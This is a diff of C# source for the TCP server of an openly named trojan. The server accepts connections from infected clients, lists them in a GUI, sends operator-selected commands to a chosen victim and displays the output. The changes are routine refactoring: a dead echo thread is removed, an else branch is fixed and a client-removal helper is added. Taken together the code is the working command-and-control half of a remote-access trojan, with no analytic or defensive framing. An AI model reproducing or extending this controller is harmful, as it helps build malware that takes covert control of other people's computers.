@@ -22,9 +22,7 @@ namespace Server.TCP
 
         public TcpListener tcpServer;
 
-        private static int clientCount = 0;
-        
-        private List<TrojanClient>  trojanClients = new List<TrojanClient>();
+        private List<TrojanClient> trojanClients = new List<TrojanClient>();
 
         public TcpServer()
         {
@@ -48,7 +46,7 @@ namespace Server.TCP
                     while (true)
                     {
                         var client = await tcpServer.AcceptTcpClientAsync();
-                        
+
                         int i = 0;
 
                         NetworkStream stream = client.GetStream();
@@ -62,7 +60,7 @@ namespace Server.TCP
                         var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                         trojanClients.Add(new TrojanClient(client, clientName));
                         serverGUI.SetClients(trojanClients.Select(x => x.Name));
-                        ThreadPool.QueueUserWorkItem(ThreadProc, client);
+                        //ThreadPool.QueueUserWorkItem(ThreadProc, client);
                     }
 
                 }));
@@ -82,40 +80,7 @@ namespace Server.TCP
                 }
             }
         }
-
-        private static async void ThreadProc(object obj)
-        {
-            await serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(async delegate ()
-            {
-                var client = (TcpClient)obj;
-                var bytes = new Byte[256];
-                string data = null;
-                // Get a stream object for reading and writing
-                NetworkStream stream = client.GetStream();
-
-                int i = 0;
-
-                while (true)
-                {
-                    if (stream.CanRead)
-                    {
-                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
-                    }
-
-                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    byte[] msg = null;
-
-                    clientCount++;
-                    msg = System.Text.Encoding.ASCII.GetBytes("ceva");
-                    if (stream.CanWrite)
-                    {
-                        await stream.WriteAsync(msg, 0, msg.Length);
-                    }
-
-
-                }
-            }));
-        }
+        
 
         async void SendMessage(object sender, EventArgs e)
         {
@@ -147,12 +112,14 @@ namespace Server.TCP
                     }
                     var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                     serverGUI.DisplayOutput(response);
-                } catch
+                }
+                catch
                 {
                     serverGUI.DisplayOutput("Client does not respond.");
                     RemoveClient(trojanClient);
                 }
             }
+            else
             {
                 serverGUI.DisplayOutput("Select a client and a command.");
             }
@@ -162,6 +129,13 @@ namespace Server.TCP
         {
             trojanClients.Remove(trojanClient);
             serverGUI.SetClients(trojanClients.Select(x => x.Name));
+        }
+
+        private void RemoveClient(TcpClient client)
+        {
+            var trojanClient = trojanClients.Where(x => x.Client == client).FirstOrDefault();
+            if (trojanClient != null)
+                RemoveClient(trojanClient);
         }
     }
 }
